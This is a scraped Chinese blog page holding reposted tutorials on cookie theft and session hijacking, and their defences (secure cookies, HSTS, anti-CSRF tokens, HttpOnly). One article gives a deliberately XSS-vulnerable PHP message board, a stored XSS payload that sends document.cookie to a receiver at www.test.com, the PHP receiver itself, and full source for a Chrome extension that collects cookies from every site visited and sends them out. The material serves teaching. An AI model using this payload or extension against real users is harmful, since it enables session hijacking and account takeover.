font-family: &quot;PT Serif&quot;; line-height: 1.5em;">如果同时支持http和https，那么还是可以使用网络监听http请求获取cookie。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">只支持https，不支持http。这样就好了吗？No.</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">https站点攻击：301重定向</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">例如www.example.com只支持https协议，当用户直接输入example.com（大部分用户都不会手动输入协议前缀），web server通常的处理是返回301要求浏览器重定向到</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">https://www.example.com</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">。这次301请求是http的！而且带了cookie，这样又将cookie明文暴露在网络上了。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御1</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">把标识session的cookie设置成secure。上面提到的secure cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。 然后现实很残酷，很多站点根本无法做到所有的请求都走https。原因有很多，可能是成本考虑，可能是业务需求。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御2</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">设置</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">Strict-Transport-Security header</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。更多</span><a href="https://www.owasp.org/index.php/HTTP_Strict_Transport_Security" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">点此</a> <a href="http://www.wooyun.org/bugs/wooyun-2010-049877/auth/36b625b1c47b40b270c6a390a0fb9525" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">乌云案例</a></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">思考</span></h2><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">如果偷取cookie失败，无法session劫持，攻击者如何再发起攻击？劫持session的目的是拿到登录态，从而获得服务器授权做很多请求，例如账户变更。如果劫持不到session，也能够做授权请求不是也达到攻击的目的了？无需拿到session cookie，跨站发起请求就可以了，这就是CSRF！server通过把用户凭证存储在cookie以维持session，http/https协议每次访问都会自动传输cookie，协议上的缺陷是导致可进行CSRF攻击的根本原因！防御方式：使用anti-forgery token</span></div><blockquote style="font-size: inherit; margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-style: none none none solid; border-color: initial; border-image: initial; vertical-align: baseline; quotes: none;"><div style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-style: italic;">大部分攻击都是提权行为，最基本的提权通过偷取用户名密码，不成功转而窃取session，窃取不成转而跨站攻击，实在不行重放也可以造成危害</span></div></blockquote><div style="font-size: inherit; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">原文地址：</span><a href="http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html</a></div><div style="font-size: inherit; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><br></div></div></div></div></div></div></div></div></div></div></div><div><br></div></div></body></html>
                </div>
                <div class="read-all">
                    <a  href="/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/">Session劫持原理，技术实现与防范_Web开发</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2020-07-07
                    </div>
                    <div class="label-card">
                        <i class="fa fa-user"></i>tldsn
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#印象笔记导入" title="Category: 印象笔记导入" rel="category">印象笔记导入</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <html><head></head><body><div class="ennote">
  <div style="--en-clipped-content:simplified">
<div><br></div><div style="font-size: 16px; display:block; min-width: 100%; "> <div style="background-color:transparent;font:inherit;vertical-align:baseline;"><div style="background-color:transparent;font:inherit;vertical-align:baseline;font-family:&quot;PT Serif&quot;;font-size:16px;line-height:1.5em;color:rgb(31, 9, 9);text-align:left;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;z-index:200;padding-left:2em;padding-right:2em;margin-left:auto;margin-right:auto;position:relative;width:36em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;margin-left:-25px;margin-right:25px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;padding-top:0px;padding-bottom:9em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;margin-bottom:0px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:0px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:0px;"><h1 style="border:0px none;font:inherit;vertical-align:baseline;font-family:&quot;PT Serif&quot;;text-align:left;font-size:35px;font-weight:normal;line-height:35px;margin-bottom:20px;padding:0px;margin:0px;"> Session劫持原理，技术实现与防范 </h1><div style="padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;height:1em;line-height:1;text-align:center;margin:0px;padding-top:1.5em;padding-bottom:1.5em;margin-bottom:0px;"><div style="padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;opacity:0.5;margin:0px;background:rgba(0, 0, 0, 0) -webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%) repeat scroll 0% 0%;margin-bottom:0px;"><span style="font:inherit;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;margin:0px;opacity:0.5;background:rgba(0, 0, 0, 0) -webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%) repeat scroll 0% 0%;"></span></div></div></div>
                          
                          
    

    
  
    

      
  
  
    <p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">(转载附原文链接：<a href="http://jahng.cn/node/58" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">http://jahng.cn/node/58</a>)</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">今天4月1号( 这篇博客写了两个晚上 )，下午公司没有像往常一样放眼保健操的音乐，而是放了二十分钟张国荣的歌，挺赞的！</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">看了吴翰清的《白帽子讲Web安全》这本书的认证与会话管理这一章的内容，所以写这篇读书笔记。在看懂了书上提到的知识点的基础上，加上一些自己的理解，再通过代码实现，来记录一下自己对 session 安全的理解。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">一般的 Web 登陆认证实现方案是，用户认证登录通过后，在服务端维护在线用户的 Session ，用户下次访问网站的时候，只要告诉服务器使用哪一个session就行，浏览器是通过把当前用户的SessionID告诉服务器，服务器则是通过这个SessionID来识别当前用户的session，因为http是无状态的，所以一般的做法是将SessionID保存在cookie中。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">SessionID是用户登陆之后才有的（假设网站上没有未登录的情况使用session），而服务端又是通过SessionID来认证当前登录用户，所以如果这个SessionID在生命周期内被别人窃取，那么攻击的人就可以直接使用这个SessionID来登录账号，不需要在攻击登录过程（比如暴力破解密码等），这就是Session劫持。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">那么，如何实现Session劫持呢？</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">第一种方法：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">上面提到了，SessionID常常保存在cookie里面，cookie是存在客户端浏览器的，所以我们可以使用XSS来获取用户的SessionID。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">场景：假设有一个网站，这个网站需要一个留言板的功能，登录的用户可以在这个留言板留言，并且所有登录用户都可以浏览留言列表。公司技术老大觉得这个功能太简单了，就决定让一个刚毕业没有任何项目经验的小雏鹰来做这个功能。然后小雏鹰很快完成了。如下代码：</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;session_start();//假设用户已经登录
&nbsp;&nbsp;&nbsp;&nbsp;if(isset($_GET['message'])){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把数据存数据库，没有任何验证，过滤或者转义
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents('message.log',$_GET['message']."\r\n",FILE_APPEND);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;$messageList&nbsp;=&nbsp;explode("\r\n",trim(file_get_contents('message.log'),"\r\n"));
?&gt;
&lt;html&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;charset="utf-8"/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;body&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;action=""&nbsp;method="get"&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;textarea&nbsp;name="message"&nbsp;cols="30"&nbsp;rows="10"&gt;&lt;/textarea&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type="submit"&nbsp;value="留言"&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;foreach($messageList&nbsp;as&nbsp;$message){&nbsp;?&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;?php&nbsp;echo&nbsp;$message;&nbsp;?&gt;&lt;/li&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;}&nbsp;?&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/body&gt;
&lt;/html&gt;</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">功能做好了，然后有一个老鸟骇客通过观察发现了这个网站存在XSS漏洞，然后他准备通过这个漏洞来获取这个网站登录用户的SessionID。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">首先简单实现一个Cookie接收器,假设域名接收器的访问链接是：<a href="https://www.test.com/getCookie.php" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">https://www.test.com/getCookie.php</a></p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">&lt;?php
$cookie&nbsp;=&nbsp;$_GET['cookie'];

//&nbsp;后面的代码就是把cookie写入数据库</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">然后他在该网站上注册了个账号，并在留言板留言了，留言的内容如下：</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">&lt;script&gt;window.location.href&nbsp;=&nbsp;'https://www.test.com/getCookie.php?cookie='&nbsp;+&nbsp;document.cookie;&lt;/script&gt;</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">一切都准备妥当了，最后，其他登录用户访问留言列表页的时候，这段XSS Payload被浏览器解析执行，跳转到<a href="https://www.test.com/getCookie.php" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">https://www.test.com/getCookie.php</a>这个链接，并把当前用户的cooie也带过去了。</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">https://www.test.com/getCookie.php?cookie=PHPSESSID=8jbvd2vqqb2ojfnioplatklor2</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">这个时候，攻击者就可以使用这个SessionID登录用户的账号了。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">第二种方法</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">chrome扩展是用来扩展chrome浏览器功能的,比如屏幕截图等。很多用户都会使用各种各样的扩展来简化自己的工作，开发人员（比如我）也可以自己开发自己的扩展用来简化自己的开发工作。但是非技术人员很少开率一个chrome的扩展是否安全。chrome是可以读取用户浏览器的cookie的，我这里实现一下如何使用chrome extension来实现session劫持。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">首先来开发一个chrome extension,功能是用来窃取用户客户端浏览器的cookie。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">创建一个文件夹叫session_hijacking，以下文件都保存在这个文件夹。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">先定义manifest.json文件，这个文件是定义chrome扩展以及一些权限配置。</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"manifest_version":&nbsp;2,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"name":&nbsp;"Session&nbsp;Hijacking&nbsp;Demo",
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"version":&nbsp;"1.0.0.0",
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"content_scripts":[{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"matches":["http://*/*","https://*/*"],
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"js":["jquery-1.8.3.min.js","content.js"]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}],
&nbsp;&nbsp;&nbsp;&nbsp;"background":{
&nbsp;&nbsp;&nbsp;&nbsp;"scripts":["jquery-1.8.3.min.js","background.js"]
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">然后写一个content.js，这个是嵌入到网页的脚本文件，在这个文件里面我们通过js获取客户端的cookie，然后传递给background.js这个文件做处理，这个文件是干嘛的？下一步说明。</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">var&nbsp;msg&nbsp;=&nbsp;{
		cookie:&nbsp;document.cookie,
	};
//chrome.runtime.sendMessage&nbsp;这个函数向&nbsp;background.js&nbsp;请求数据&nbsp;
chrome.runtime.sendMessage(msg);</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">接着我们写一个background.js文件，这个文件是后台脚本，可以简单理解为后台程序，通过这个文件我们跟服务器交互，所以background.js的代码主要实现，从content.js获取用户客户端cookie，然后发送给服务器端的cookie接收器。</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">//chrome.runtime.onMessage.addListener&nbsp;这个函数监听content.js&nbsp;的请求
chrome.runtime.onMessage.addListener(function(request,&nbsp;sender,&nbsp;sendRequest){&nbsp;&nbsp;
var&nbsp;cookie&nbsp;=&nbsp;request.cookie;
&nbsp;&nbsp;$.ajax({
&nbsp;&nbsp;&nbsp;&nbsp;method:'get',
&nbsp;&nbsp;&nbsp;&nbsp;url:'http://www.test.com/getCookie.php',
&nbsp;&nbsp;&nbsp;&nbsp;data:&nbsp;'cookie='+cookie,
&nbsp;&nbsp;&nbsp;&nbsp;success:function(data){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(data);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;});

})</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">因为我们依赖了jquery，所以把jquery-1.8.3.min.js文件也放到session_hijacking目录下面，最后我们的目录结构应该是这样的：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135221333649.gif" width="576" height="315" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiJlZDFlNzYzMS03OGQ2LTQxOTYtOTg3Zi1iNTcxY2Y5NTYzNDIifQ==" data-original-width="761" mime="image/gif" data-original-height="416" id="c8fb897954ca84777ca3be2529db9ab4" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">然后把session_hijacking文件夹拖到chrome的设置页面的扩展程序安装，如图所示：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135284331255.gif" width="576" height="206" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiIwMDYyNWNkNi05ZjgzLTRjYWMtYWU1Ni03NGI2NjY2MDc5YTMifQ==" data-original-width="1193" mime="image/gif" data-original-height="427" id="30ee177da1628424021b3907ae70e7bb" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">chrome extension准备好了，然后我们要在<a href="http://www.test.com/" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">www.test.com</a>对应的服务端开发一个cookie接收器，文件名叫getCookie.php</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">&lt;?php
$cookie&nbsp;=&nbsp;$_GET['cookie'];

//&nbsp;后面的代码就是把cookie写入数据库

echo&nbsp;'Session劫持成功，服务器端成功保存该用户的Cookie！'.$cookie;</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">最后我们使用csdn做测试（又是csdn，之前我演示CSRF的时候就是用csdn做小白鼠的）。登录csdn，打开chrome extension的背景页，我们可以看到控制台如下信息：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135318634894.gif" width="576" height="309" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiJhZDY5MTJkMy05MjJlLTRhYTEtYTA0MS0yNzJkNDc2NzNjZGQifQ==" data-original-width="1013" mime="image/gif" data-original-height="544" id="c6d596db1f6920a56d61e94464bdea19" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">所以呢，chrome extension不要随便乱用了。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">总结，上面演示的两种方法其实原理都是一样的，就是使用各种手段通过 js 获取用户客户端的cookie，所以防范这种情况，我们可以通过设置cookie HttpOnly 来防止客户端js获取到cookie。比如drupal的网站就不能通过js获取到对应的SessionID，不信你看下图： 这个是通过浏览器调试工具看到的cookie：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135371311990.gif" width="576" height="225" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiI0NmYwOWRmNi0wYTE2LTQ4NWItOTIyZS0yZmE5Y2IyNmQ4YjMifQ==" data-original-width="771" mime="image/gif" data-original-height="301" id="a2936aa59ad405af6123d162d9be5b33" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">这个是通过document.cookie获取到的cookie：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135389883764.gif" width="576" height="181" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiI5MGM5MGEyYS1jZTM3LTRhZTItYjNhYS1kNmRkNDU1M2I5MDkifQ==" data-original-width="1337" mime="image/gif" data-original-height="421" id="e11d6acd50058461cfbc1812fb4d0a6b" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">我们复制这个SessionID我们看到内容如下，使用了HttpOnly：</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">SESS7e15773ea34aa5ed2304263fc16a295e=RWE-6_ADzeBuw0rZT6Ef6GGmgTuSSTrp6XO-c8688gs;&nbsp;expires=Sat,&nbsp;22&nbsp;Apr&nbsp;2017&nbsp;18:52:50&nbsp;GMT;&nbsp;path=/;&nbsp;domain=.test.com;&nbsp;HttpOnly</pre><br><br></div></div></div></div></div></div></div></div></div></div>
</div>
</div></body></html>
                </div>
                <div class="read-all">
